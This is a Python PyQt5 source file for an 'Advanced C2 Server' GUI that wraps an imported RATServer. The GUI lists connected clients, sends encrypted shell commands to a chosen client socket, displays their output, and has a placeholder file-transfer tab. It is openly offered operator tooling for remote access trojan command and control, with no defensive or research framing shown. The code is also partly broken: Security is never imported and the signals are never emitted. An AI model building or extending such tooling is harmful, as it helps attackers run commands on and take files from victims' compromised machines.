import sys
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QTextEdit, QListWidget, QPushButton, QLabel, QTabWidget, 
                            QLineEdit, QSplitter, QMessageBox)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QTextCursor
import socket
import threading
import json
from datetime import datetime
from c2_server import RATServer  # Import your existing server logic

class ServerThread(QThread):
    new_connection = pyqtSignal(str)
    log_message = pyqtSignal(str)
    command_output = pyqtSignal(str, str)

    def __init__(self, server):
        super().__init__()
        self.server = server

    def run(self):
        self.server.start_server()

class C2GUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.server = RATServer()
        self.server.log_message = self.log_message  # Redirect logs to GUI
        self.clients = {}
        self.init_ui()
        self.start_server()

    def init_ui(self):
        self.setWindowTitle("Advanced C2 Server")
        self.setGeometry(100, 100, 1000, 700)

        # Main Widget
        main_widget = QWidget()
        self.setCentralWidget(main_widget)

        # Layouts
        main_layout = QHBoxLayout()
        left_panel = QVBoxLayout()
        right_panel = QVBoxLayout()

        # Left Panel - Clients and Logs
        self.client_list = QListWidget()
        self.client_list.itemClicked.connect(self.client_selected)
        left_panel.addWidget(QLabel("Connected Clients:"))
        left_panel.addWidget(self.client_list)

        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        left_panel.addWidget(QLabel("Server Logs:"))
        left_panel.addWidget(self.log_display)

        # Right Panel - Command Interface
        self.tabs = QTabWidget()
        
        # Command Tab
        cmd_tab = QWidget()
        cmd_layout = QVBoxLayout()
        
        self.command_output = QTextEdit()
        self.command_output.setReadOnly(True)
        cmd_layout.addWidget(self.command_output)
        
        self.command_input = QLineEdit()
        self.command_input.returnPressed.connect(self.send_command)
        cmd_layout.addWidget(self.command_input)
        
        cmd_send_btn = QPushButton("Send Command")
        cmd_send_btn.clicked.connect(self.send_command)
        cmd_layout.addWidget(cmd_send_btn)
        
        cmd_tab.setLayout(cmd_layout)
        self.tabs.addTab(cmd_tab, "Command")

        # File Transfer Tab
        file_tab = QWidget()
        file_layout = QVBoxLayout()
        
        # ... (Add file transfer UI components here)
        
        file_tab.setLayout(file_layout)
        self.tabs.addTab(file_tab, "File Transfer")

        right_panel.addWidget(self.tabs)

        # Combine Layouts
        splitter = QSplitter(Qt.Horizontal)
        left_widget = QWidget()
        left_widget.setLayout(left_panel)
        right_widget = QWidget()
        right_widget.setLayout(right_panel)
        splitter.addWidget(left_widget)
        splitter.addWidget(right_widget)
        splitter.setSizes([300, 700])

        main_layout.addWidget(splitter)
        main_widget.setLayout(main_layout)

        # Menu Bar
        menubar = self.menuBar()
        file_menu = menubar.addMenu('File')
        
        exit_action = file_menu.addAction('Exit')
        exit_action.triggered.connect(self.close)

    def start_server(self):
        self.server_thread = ServerThread(self.server)
        self.server_thread.new_connection.connect(self.update_client_list)
        self.server_thread.log_message.connect(self.log_message)
        self.server_thread.command_output.connect(self.display_command_output)
        self.server_thread.start()

    def client_selected(self, item):
        self.current_client = item.text()

    def send_command(self):
        if not hasattr(self, 'current_client'):
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        cmd = self.command_input.text()
        if not cmd:
            return
            
        # Send command to server logic
        client_socket = self.clients[self.current_client]
        try:
            command = json.dumps({"type": "cmd", "command": cmd})
            encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            client_socket.send(encrypted.encode('utf-8'))
            
            self.log_message(f"Sent command to {self.current_client}: {cmd}")
            self.command_input.clear()
        except Exception as e:
            self.log_message(f"Error sending command: {str(e)}")

    def display_command_output(self, client, output):
        if client == self.current_client:
            self.command_output.append(f"Client {client}:\n{output}")
            self.command_output.moveCursor(QTextCursor.End)

    def update_client_list(self, client_addr):
        self.client_list.addItem(client_addr)
        self.clients[client_addr] = self.server.clients[client_addr]

    def log_message(self, message):
        self.log_display.append(message)
        self.log_display.moveCursor(QTextCursor.End)

    def closeEvent(self, event):
        self.server.stop_server()
        self.server_thread.quit()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = C2GUI()
    gui.show()
    sys.exit(app.exec_())